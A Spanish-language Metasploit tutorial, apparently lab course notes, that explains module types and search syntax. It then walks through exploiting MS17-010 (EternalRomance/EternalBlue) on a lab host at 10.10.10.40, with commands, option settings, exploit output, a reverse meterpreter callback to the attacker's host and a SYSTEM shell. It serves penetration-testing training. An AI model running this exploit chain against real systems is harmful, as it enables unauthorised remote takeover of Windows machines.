# Sección 3: Módulos de Metasploit

## 📚 ¿Qué son los Módulos de Metasploit?

Como mencionamos anteriormente, los **módulos de Metasploit** son scripts preparados con un propósito específico y funciones correspondientes que ya han sido desarrollados y probados en entornos reales.

### Definición de Exploit Modules

La categoría de **exploit** consiste en las llamadas **pruebas de concepto (POCs - Proof of Concepts)** que se pueden utilizar para explotar vulnerabilidades existentes de una manera **en gran medida automatizada**.

---

## ⚠️ Advertencia Importante: Falla de Exploit ≠ No Vulnerable

### Concepto Erróneo Común

> **FALSO**: "Si el exploit falla, significa que la vulnerabilidad no existe"

Muchas personas piensan erróneamente que **el fallo del exploit demuestra que la vulnerabilidad sospechada no existe**.

### La Realidad

> **VERDADERO**: El fallo solo prueba que el exploit de Metasploit no funciona, NO que la vulnerabilidad no exista.

**Razón principal**: Muchos exploits requieren **personalización** según los hosts objetivo para que el exploit funcione correctamente.

### Implicación Profesional

> Por lo tanto, las herramientas automatizadas como Metasploit Framework deben considerarse solo como una **herramienta de apoyo** y **NO un sustituto** de nuestras habilidades manuales.

**Principio fundamental**:
```
Metasploit = Herramienta de APOYO
           ≠ Reemplazo de HABILIDADES MANUALES
```

---

## 🗂️ Estructura de Módulos en MSFconsole

Una vez que estamos en `msfconsole`, podemos seleccionar de una extensa lista que contiene todos los módulos de Metasploit disponibles.

### Organización Jerárquica

Cada módulo está estructurado en carpetas siguiendo un patrón específico:

#### Sintaxis General

```
<No.> <type>/<os>/<service>/<name>
```

#### Ejemplo Real

```
794   exploit/windows/ftp/scriptftp_list
```

Desglosemos cada componente:

---

## 🔢 Componentes de la Estructura de Módulos

### 1. **Index No. (Número de Índice)**

**Propósito**: El tag `No.` se mostrará para seleccionar el exploit que queremos usar posteriormente durante nuestras búsquedas.

**Ventaja**: Como veremos más adelante, el tag `No.` puede ser muy útil para seleccionar módulos específicos de Metasploit rápidamente.

**Uso práctico**:
```bash
# En lugar de escribir toda la ruta:
msf6 > use exploit/windows/ftp/scriptftp_list

# Podemos usar simplemente el número:
msf6 > use 794
```

---

### 2. **Type (Tipo de Módulo)**

El tag `Type` es el **primer nivel de segregación** entre los módulos de Metasploit.

**Función**: Al mirar este campo, podemos determinar qué logrará el código de este módulo.

#### 📊 Tipos de Módulos Disponibles

| Tipo | Descripción |
|------|-------------|
| **Auxiliary** | Capacidades de escaneo, fuzzing, sniffing y administración. Ofrecen asistencia y funcionalidad extra. |
| **Encoders** | Aseguran que los payloads lleguen intactos a su destino. |
| **Exploits** | Definidos como módulos que explotan una vulnerabilidad que permitirá la entrega del payload. |
| **NOPs** | (No Operation code) Mantienen los tamaños de payload consistentes a través de los intentos de exploit. |
| **Payloads** | Código que se ejecuta remotamente y llama de vuelta a la máquina del atacante para establecer una conexión (o shell). |
| **Plugins** | Scripts adicionales que pueden integrarse dentro de una evaluación con msfconsole y coexistir. |
| **Post** | Amplia variedad de módulos para recopilar información, pivotar más profundo, etc. |

#### Explicación Detallada de Cada Tipo

##### **Auxiliary (Auxiliares)**
**Función**: Asistencia y funcionalidad extra sin explotar directamente

**Capacidades**:
- 🔍 **Scanning**: Escaneo de puertos, servicios, redes
- 🧪 **Fuzzing**: Pruebas de inputs aleatorios para encontrar bugs
- 👃 **Sniffing**: Captura de tráfico de red
- ⚙️ **Admin**: Capacidades administrativas

**Ejemplos**:
```bash
auxiliary/scanner/portscan/tcp
auxiliary/scanner/smb/smb_version
auxiliary/scanner/http/dir_scanner
```

##### **Encoders (Codificadores)**
**Función**: Asegurar que los payloads lleguen intactos

**Propósito**:
- Evitar detección por antivirus
- Eliminar caracteres "malos" (null bytes, etc.)
- Ofuscar el payload
- Bypass de filtros de seguridad

**Ejemplos**:
```bash
encoders/x86/shikata_ga_nai
encoders/x64/xor_dynamic
```

##### **Exploits**
**Función**: Explotar una vulnerabilidad específica

**Propósito**: Permitir la **entrega del payload** al comprometer el sistema

**Ejemplos**:
```bash
exploit/windows/smb/ms17_010_eternalblue
exploit/linux/http/apache_mod_cgi_bash_env_exec
exploit/multi/handler
```

##### **NOPs (No Operation)**
**Función**: Mantener tamaños de payload consistentes

**Concepto técnico**: 
- NOP = No Operation (instrucción que no hace nada)
- Usado como "relleno" en exploits de buffer overflow
- Crea "NOP sleds" (rampas de NOPs)

**Por qué es importante**:
```
[NOP][NOP][NOP]...[SHELLCODE]
└─ Padding seguro ─┘
```

##### **Payloads**
**Función**: Código que se ejecuta DESPUÉS del exploit exitoso

**Comportamiento**: 
- Se ejecuta remotamente en el objetivo
- Llama de vuelta (callback) a la máquina del atacante
- Establece una conexión o shell

**Tipos**:
- Singles: Payload completo autocontenido
- Stagers: Payload pequeño que descarga el resto
- Stages: Segunda etapa descargada

**Ejemplos**:
```bash
payload/windows/meterpreter/reverse_tcp
payload/linux/x64/shell/bind_tcp
```

##### **Plugins**
**Función**: Scripts adicionales que extienden msfconsole

**Características**:
- Se integran dentro de msfconsole
- Pueden coexistir con otras funcionalidades
- Agregan características específicas

**Ejemplos**:
```bash
plugins/nessus.rb
plugins/openvas.rb
plugins/wmap.rb
```

##### **Post (Post-explotación)**
**Función**: Módulos para acciones DESPUÉS del compromiso

**Actividades**:
- 📊 Recopilar información
- ↗️ Pivotar más profundo en la red
- 🔑 Extraer credenciales
- 📈 Escalar privilegios
- 🧹 Limpiar rastros

**Ejemplos**:
```bash
post/windows/gather/hashdump
post/linux/gather/enum_system
post/multi/recon/local_exploit_suggester
```

---

### ⚡ Módulos Interactuables (Iniciadores)

**Nota importante**: Al seleccionar un módulo para usar con el comando `use <no.>`, solo se pueden usar con los siguientes módulos que funcionan como **iniciadores** (o módulos interactuables):

| Tipo | Descripción | ¿Interactuable? |
|------|-------------|-----------------|
| **Auxiliary** | Escaneo, fuzzing, sniffing, capacidades admin | ✅ SÍ |
| **Exploits** | Explotan vulnerabilidad para entrega de payload | ✅ SÍ |
| **Post** | Módulos de post-explotación | ✅ SÍ |
| **Encoders** | Codifican payloads | ❌ NO (se usan con exploits) |
| **NOPs** | Generadores de NOP | ❌ NO (se usan con exploits) |
| **Payloads** | Código a ejecutar | ❌ NO (se configuran en exploits) |
| **Plugins** | Extensiones | ❌ NO (se cargan con `load`) |

**Ejemplo de uso**:
```bash
# CORRECTO - módulos interactuables
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > use post/windows/gather/hashdump

# INCORRECTO - no son módulos iniciadores
msf6 > use payload/windows/meterpreter/reverse_tcp  # Error
msf6 > use encoder/x86/shikata_ga_nai  # Error
```

---

### 3. **OS (Sistema Operativo)**

El tag `OS` especifica para qué **sistema operativo y arquitectura** fue creado el módulo.

**Razón**: Naturalmente, diferentes sistemas operativos requieren diferente código para obtener los resultados deseados.

**Sistemas operativos comunes**:
```
windows    → Microsoft Windows (todas las versiones)
linux      → Distribuciones Linux
unix       → Sistemas Unix (BSD, Solaris, etc.)
osx        → macOS / Mac OS X
android    → Sistema operativo Android
multi      → Multiplataforma (funciona en varios OS)
```

**Ejemplo de diferencias**:
```bash
exploit/windows/smb/ms17_010_eternalblue  # Solo Windows
exploit/linux/http/webmin_backdoor        # Solo Linux
exploit/multi/handler                      # Cualquier plataforma
```

---

### 4. **Service (Servicio)**

El tag `Service` se refiere al **servicio vulnerable** que está ejecutándose en la máquina objetivo.

**Para exploits**: Servicio vulnerable específico
```bash
exploit/windows/smb/...     # Servicio SMB
exploit/linux/http/...      # Servicio HTTP
exploit/windows/rdp/...     # Servicio RDP
```

**Para módulos auxiliary y post**: Puede referirse a una actividad más general

**Ejemplo con "gather"**:
```bash
post/windows/gather/credentials  # "gather" = recopilación
post/linux/gather/enum_system    # Enumerar sistema
```

**Servicios comunes**:
- **smb**: Server Message Block (compartición de archivos Windows)
- **http/https**: Servidores web
- **ftp**: File Transfer Protocol
- **ssh**: Secure Shell
- **rdp**: Remote Desktop Protocol
- **mysql/mssql/postgresql**: Bases de datos
- **smtp**: Correo electrónico

---

### 5. **Name (Nombre)**

Finalmente, el tag `Name` explica la **acción real** que se puede realizar usando este módulo creado para un propósito específico.

**Función**: Describe exactamente qué hace el módulo

**Ejemplos con descripciones**:

```bash
exploit/windows/ftp/scriptftp_list
                        └─ "scriptftp_list" = Vulnerabilidad en ScriptFTP LIST command

exploit/linux/http/apache_mod_cgi_bash_env_exec
                                      └─ "bash_env_exec" = Ejecución vía variables de entorno Bash

post/windows/gather/hashdump
                        └─ "hashdump" = Extraer hashes de contraseñas
```

---

## 🔍 Búsqueda de Módulos

Metasploit ofrece una **función de búsqueda bien desarrollada** para los módulos existentes.

### Comando Help Search

```bash
msf6 > help search
```

**Salida del comando**:

```
Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.
```

---

### 📋 Opciones de Búsqueda

#### OPTIONS (Opciones de comando)

| Opción | Descripción |
|--------|-------------|
| **-h** | Mostrar información de ayuda |
| **-o <file>** | Enviar salida a un archivo en formato CSV |
| **-S <string>** | Patrón regex para filtrar resultados de búsqueda |
| **-u** | Usar módulo si solo hay un resultado |
| **-s <search_column>** | Ordenar resultados basándose en columna en orden ascendente |
| **-r** | Revertir orden de resultados a descendente |

**Ejemplos de uso de opciones**:

```bash
# Guardar resultados en CSV
msf6 > search ms17_010 -o results.csv

# Usar automáticamente si solo hay 1 resultado
msf6 > search ms17_010 -u

# Ordenar por nombre
msf6 > search eternal -s name

# Ordenar por fecha (descendente)
msf6 > search cve:2021 -s date -r

# Filtrar con regex
msf6 > search -S "eternal.*blue"
```

---

### 🔑 Keywords (Palabras Clave de Búsqueda)

Estas son las palabras clave que podemos usar para buscar módulos específicos:

| Keyword | Descripción |
|---------|-------------|
| **aka** | Módulos con un nombre AKA (también-conocido-como) coincidente |
| **author** | Módulos escritos por este autor |
| **arch** | Módulos que afectan esta arquitectura |
| **bid** | Módulos con un Bugtraq ID coincidente |
| **cve** | Módulos con un CVE ID coincidente |
| **edb** | Módulos con un Exploit-DB ID coincidente |
| **check** | Módulos que soportan el método 'check' |
| **date** | Módulos con una fecha de divulgación coincidente |
| **description** | Módulos con una descripción coincidente |
| **fullname** | Módulos con nombre completo coincidente |
| **mod_time** | Módulos con fecha de modificación coincidente |
| **name** | Módulos con nombre descriptivo coincidente |
| **path** | Módulos con ruta coincidente |
| **platform** | Módulos que afectan esta plataforma |
| **port** | Módulos con un puerto coincidente |
| **rank** | Módulos con un ranking coincidente (descriptivo ej: 'good' o numérico con operadores ej: 'gte400') |
| **ref** | Módulos con una referencia coincidente |
| **reference** | Módulos con una referencia coincidente |
| **target** | Módulos que afectan este objetivo |
| **type** | Módulos de un tipo específico (exploit, payload, auxiliary, encoder, evasion, post, o nop) |

---

### 📊 Columnas de Ordenamiento Soportadas

| Columna | Descripción |
|---------|-------------|
| **rank** | Ordenar módulos por su ranking de explotabilidad |
| **date** | Ordenar módulos por su fecha de divulgación (alias para disclosure_date) |
| **disclosure_date** | Ordenar módulos por su fecha de divulgación |
| **name** | Ordenar módulos por su nombre |
| **type** | Ordenar módulos por su tipo |
| **check** | Ordenar módulos por si tienen o no método de verificación |

---

### 💡 Ejemplos Prácticos de Búsqueda

#### Ejemplo 1: Búsqueda Básica

```bash
msf6 > search cve:2009 type:exploit
```
**Resultado**: Todos los exploits relacionados con CVEs de 2009

#### Ejemplo 2: Exclusión de Plataformas

```bash
msf6 > search cve:2009 type:exploit platform:-linux
```
**Resultado**: Exploits CVE 2009 EXCEPTO los de Linux

#### Ejemplo 3: Ordenamiento

```bash
msf6 > search cve:2009 -s name
```
**Resultado**: CVEs de 2009 ordenados por nombre

#### Ejemplo 4: Ordenamiento Inverso

```bash
msf6 > search type:exploit -s type -r
```
**Resultado**: Exploits ordenados por tipo en orden descendente

---

### 🎯 Búsqueda de EternalRomance (Ejemplo Completo)

Supongamos que queremos encontrar el exploit **EternalRomance** para sistemas operativos Windows antiguos.

#### Búsqueda Simple

```bash
msf6 > search eternalromance
```

**Resultado**:
```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
```

**Análisis del resultado**:
- 🔢 **#**: Índice del módulo (0, 1)
- 📛 **Name**: Ruta completa del módulo
- 📅 **Disclosure Date**: Fecha de divulgación de la vulnerabilidad
- ⭐ **Rank**: Ranking de confiabilidad del exploit
- ✅ **Check**: Si tiene método de verificación
- 📝 **Description**: Descripción del módulo

#### Búsqueda Refinada (Solo Exploits)

```bash
msf6 > search eternalromance type:exploit
```

**Resultado**:
```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

**Ventaja**: Filtramos solo los módulos tipo "exploit", eliminando auxiliares

---

### 🎲 Búsqueda Específica Avanzada

Podemos hacer búsquedas más específicas y reducir resultados combinando múltiples criterios.

**Sintaxis para búsqueda combinada**:
```bash
search type:<tipo> platform:<os> cve:<año> rank:<ranking> <patrón>
```

#### Ejemplo: Búsqueda Multi-criterio

```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

**Resultado**:
```
Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
   1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE
```

**Criterios aplicados**:
- ✅ **type:exploit** → Solo módulos de tipo exploit
- ✅ **platform:windows** → Solo para Windows
- ✅ **cve:2021** → Solo CVEs de 2021
- ✅ **rank:excellent** → Solo con ranking "excellent"
- ✅ **microsoft** → Que contengan "microsoft" en nombre/descripción

---

## 🎯 Selección de Módulos

### Escenario Práctico: Objetivo Vulnerable

Supongamos que tenemos un objetivo ejecutando una versión de **SMB vulnerable** a exploits EternalRomance (**MS17_010**).

### Paso 1: Escaneo del Objetivo

```bash
CyberWolfSec@htb[/htb]$ nmap -sV 10.10.10.40
```

**Resultado del escaneo**:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 10.10.10.40
Host is up (0.051s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds
```

**Información clave obtenida**:
- 🎯 **Puerto 445 abierto**: Servicio SMB
- 💻 **OS**: Microsoft Windows 7 - 10
- 🏢 **Workgroup**: WORKGROUP
- 🖥️ **Hostname**: HARIS-PC

### Paso 2: Búsqueda en MSFconsole

```bash
msf6 > search ms17_010
```

**Resultado**:
```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
```

**Análisis de resultados**:

| # | Módulo | Rank | Check | Uso |
|---|--------|------|-------|-----|
| 0 | ms17_010_eternalblue | average | Yes | Exploit principal de EternalBlue |
| 1 | ms17_010_psexec | normal | Yes | Exploit EternalRomance con PSExec |
| 2 | ms17_010_command | normal | No | Ejecución de comandos (no shell completo) |
| 3 | smb_ms17_010 | normal | No | Solo detección/verificación |

### Paso 3: Selección del Módulo

Del escaneo Nmap, detectamos:
- Servicio SMB ejecutándose
- Versión: Microsoft Windows 7 - 10

Con escaneo adicional del OS, podemos suponer que es un **Windows 7** ejecutando una instancia vulnerable de SMB.

**Selección**: Procedemos a seleccionar el módulo con índice **1** para probar si el objetivo es vulnerable.

```bash
msf6 > use 1
```

O de forma equivalente:
```bash
msf6 > use exploit/windows/smb/ms17_010_psexec
```

---

## ⚙️ Usando Módulos

### Concepto de Opciones

Dentro de los **módulos interactivos**, hay varias opciones que podemos especificar.

**Propósito**: Estas opciones se usan para **adaptar** el módulo de Metasploit al entorno dado.

**Razón**: En la mayoría de los casos, siempre necesitamos escanear o atacar diferentes direcciones IP, por lo tanto requerimos esta funcionalidad para establecer nuestros objetivos y afinarlos.

### Comando: show options

Para verificar qué opciones necesitan configurarse antes de que el exploit pueda enviarse al host objetivo:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```

### Identificando Opciones Requeridas

Todo lo que **requiere configurarse** antes de que ocurra la explotación tendrá un **"Yes"** bajo la columna **Required**.

---

### 📋 Ejemplo: Opciones del Módulo MS17_010_psexec

```bash
msf6 > use 0
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

**Salida**:

#### Module options (exploit/windows/smb/ms17_010_psexec):

```
Name                  Current Setting                          Required  Description
----                  ---------------                          --------  -----------
DBGTRACE              false                                    yes       Show extra debug trace info
LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                      rdlists/named_pipes.txt
RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                         /wiki/Using-Metasploit
RPORT                 445                                      yes       The Target port (TCP)
SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
SERVICE_DISPLAY_NAME                                           no        The service display name
SERVICE_NAME                                                   no        The service name
SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                         rmal read/write folder share
SMBDomain             .                                        no        The Windows domain to use for authentication
SMBPass                                                        no        The password for the specified username
SMBUser                                                        no        The username to authenticate as
```

#### Payload options (windows/meterpreter/reverse_tcp):

```
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST                      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port
```

#### Exploit target:

```
Id  Name
--  ----
0   Automatic
```

---

### 💡 Utilidad del Tag "No."

Aquí vemos lo útiles que pueden ser los tags `No.`.

**Ventaja**: Ahora no tenemos que escribir la ruta completa, sino solo el número asignado al módulo de Metasploit en nuestra búsqueda.

**Comparación**:
```bash
# Método largo
msf6 > use exploit/windows/smb/ms17_010_psexec

# Método corto (usando índice)
msf6 > use 0
```

---

### 📖 Comando: info

Si queremos saber más sobre el módulo, podemos usar el comando `info` después de seleccionar el módulo.

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

**Esto proporcionará**:
- Información detallada del módulo
- Referencias a CVEs
- Autores
- Targets disponibles
- Descripción completa del exploit

---

### 📄 Información Completa del Módulo

```
       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14
```

#### Provided by (Proporcionado por):
```
sleepya
zerosum0x0
Shadow Brokers
Equation Group
```

#### Available targets (Objetivos disponibles):
```
Id  Name
--  ----
0   Automatic
1   PowerShell
2   Native upload
3   MOF upload
```

#### Check supported (Verificación soportada):
```
Yes
```

#### Basic options (Opciones básicas):
```
Name                  Current Setting                          Required  Description
----                  ---------------                          --------  -----------
DBGTRACE              false                                    yes       Show extra debug trace info
LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                      rdlists/named_pipes.txt
RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                         wiki/Using-Metasploit
RPORT                 445                                      yes       The Target port (TCP)
SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
SERVICE_DISPLAY_NAME                                           no        The service display name
SERVICE_NAME                                                   no        The service name
SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                         mal read/write folder share
SMBDomain             .                                        no        The Windows domain to use for authentication
SMBPass                                                        no        The password for the specified username
SMBUser                                                        no        The username to authenticate as
```

#### Payload information (Información del payload):
```
Space: 3072
```

#### Description (Descripción):
```
This module will exploit SMB with vulnerabilities in MS17-010 to 
achieve a write-what-where primitive. This will then be used to 
overwrite the connection session information with as an 
Administrator session. From there, the normal psexec payload code 
execution is done. Exploits a type confusion between Transaction and 
WriteAndX requests and a race condition in Transaction requests, as 
seen in the EternalRomance, EternalChampion, and EternalSynergy 
exploits. This exploit chain is more reliable than the EternalBlue 
exploit, but requires a named pipe.
```

**Traducción de la descripción**:
> Este módulo explotará SMB con vulnerabilidades en MS17-010 para lograr una primitiva de escritura-donde-sea. Esto se usará para sobrescribir la información de sesión de conexión como una sesión de Administrador. Desde allí, se realiza la ejecución normal de código payload psexec. Explota una confusión de tipos entre solicitudes Transaction y WriteAndX y una condición de carrera en solicitudes Transaction, como se ve en los exploits EternalRomance, EternalChampion y EternalSynergy. Esta cadena de exploits es más confiable que el exploit EternalBlue, pero requiere un named pipe.

#### References (Referencias):
```
https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
https://nvd.nist.gov/vuln/detail/CVE-2017-0143
https://nvd.nist.gov/vuln/detail/CVE-2017-0146
https://nvd.nist.gov/vuln/detail/CVE-2017-0147
https://github.com/worawit/MS17-010
https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
```

#### Also known as (También conocido como):
```
ETERNALSYNERGY
ETERNALROMANCE
ETERNALCHAMPION
ETERNALBLUE
```

---

## 🎯 Configuración del Objetivo

Después de estar satisfechos de que el módulo seleccionado es el correcto para nuestro propósito, necesitamos **establecer algunas especificaciones** para personalizar el módulo y usarlo exitosamente contra nuestro host objetivo.

### Estableciendo RHOSTS (Remote Host)

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

### Verificar Configuración

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

**Ahora veremos**:
```
RHOSTS                10.10.10.40                              yes       The target host(s)
```

---

## 🌐 Configuración Permanente con setg

### Diferencia entre set y setg

| Comando | Alcance | Duración |
|---------|---------|----------|
| **set** | Solo módulo actual | Hasta cambiar de módulo |
| **setg** | Global (todos los módulos) | Hasta reiniciar msfconsole |

### Uso de setg

Además, existe la opción `setg`, que especifica opciones seleccionadas por nosotros como **permanentes** hasta que el programa se reinicie.

**Escenario útil**: Si estamos trabajando en un host objetivo particular, podemos usar este comando para establecer la dirección IP una vez y no cambiarla de nuevo hasta que cambiemos nuestro enfoque a una dirección IP diferente.

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

**Ventaja**: Esta configuración se mantendrá incluso si cambiamos a otro módulo.

---

## 📡 Configuración de LHOST (Local Host)

### ¿Por qué es Necesario LHOST?

Dado que estamos a punto de usar un shell inverso basado en TCP (`windows/meterpreter/reverse_tcp`), necesitamos especificar a qué dirección IP debe conectarse para establecer una conexión.

**Concepto de Reverse Shell**:
```
Objetivo (10.10.10.40) → Se conecta a → Atacante (10.10.14.15)
```

### Estableciendo LHOST

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

LHOST => 10.10.14.15
```

### Verificar Configuración Final

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

**Payload options actualizadas**:
```
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST     10.10.14.15      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port
```

---

## 🚀 Ejecución del Exploit

Una vez que todo está configurado y listo, podemos proceder a **lanzar el ataque**.

**Nota**: El payload NO se configuró aquí, ya que el predeterminado es suficiente para esta demostración.

### Comando de Ejecución

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run
```

O equivalentemente:
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

---

### 📊 Salida del Exploit

```
[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter>
```

### 🎉 Interpretando el Resultado

**Indicadores de éxito**:
- ✅ `[+] Host is likely VULNERABLE to MS17-010!`
- ✅ `[+] Connection established for exploitation`
- ✅ `[+] ETERNALBLUE overwrite completed successfully`
- ✅ `[*] Command shell session 1 opened`
- ✅ `meterpreter>` prompt

**¡Tenemos un shell en la máquina objetivo y podemos interactuar con ella!**

---

## 💻 Interacción con el Objetivo

### Obteniendo Shell del Sistema

```bash
meterpreter> shell
```

**Resultado**:
```
C:\Windows\system32>
```

### Verificar Usuario Actual

```bash
C:\Windows\system32> whoami

whoami
nt authority\system
```

**¡Éxito!** Tenemos privilegios de **SYSTEM** (máximos privilegios en Windows)

---

## 🎯 Resumen del Ejemplo

Este ha sido un ejemplo **rápido y directo** de cómo `msfconsole` puede ayudar rápidamente.

**Características del ejemplo**:
- ✅ Solo se necesitó **un módulo**
- ✅ Sin selección de payload (usó el predeterminado)
- ✅ Sin codificación necesaria
- ✅ Sin pivoteo entre sesiones o jobs
- ✅ Proceso **simple y efectivo**

### Workflow Completo Resumido

```
1. Escaneo Nmap → Identificar servicio vulnerable (SMB)
   ↓
2. Búsqueda en MSF → search ms17_010
   ↓
3. Selección de módulo → use 0
   ↓
4. Configuración → set RHOSTS, set LHOST
   ↓
5. Ejecución → exploit
   ↓
6. Shell obtenido → Acceso SYSTEM
```

---

## 🔑 Conceptos Clave para Recordar

1. **Estructura de módulos**: `<No.> <type>/<os>/<service>/<name>`
2. **Exploit fallido ≠ No vulnerable**: Puede requerir personalización
3. **Función de búsqueda**: Muy poderosa con keywords y filtros
